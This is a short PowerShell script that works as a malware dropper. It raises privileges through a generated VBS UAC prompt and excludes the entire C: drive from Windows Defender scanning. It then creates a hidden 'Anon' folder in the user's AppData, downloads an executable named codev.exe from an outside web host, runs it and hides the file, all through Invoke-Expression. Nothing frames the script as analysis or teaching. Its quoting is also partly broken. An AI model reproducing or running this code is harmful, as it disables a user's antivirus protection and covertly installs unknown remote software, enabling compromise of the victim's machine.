# Original script to set up exclusions in Windows Defender and create a hidden folder
$originalScript = @"
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0

Powershell -Command "Add-MpPreference -ExclusionPath "C:\

cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Anon"
attrib +h "Anon" /s /d
cd C:\Users\%USERNAME%\AppData\Local\Anon
"@

# Additional script to download and run "codev.exe" from the specified URL
$additionalScript = @"
Powershell -Command "Invoke-Webrequest 'https://codev-zeta.vercel.app/codev.exe' -OutFile codev.exe"
Start-Process -FilePath codev.exe
attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\codev.exe" /s /d
"@

# Concatenate the original and additional scripts
$fullScript = $originalScript + $additionalScript

# Execute the full script
Invoke-Expression $fullScript
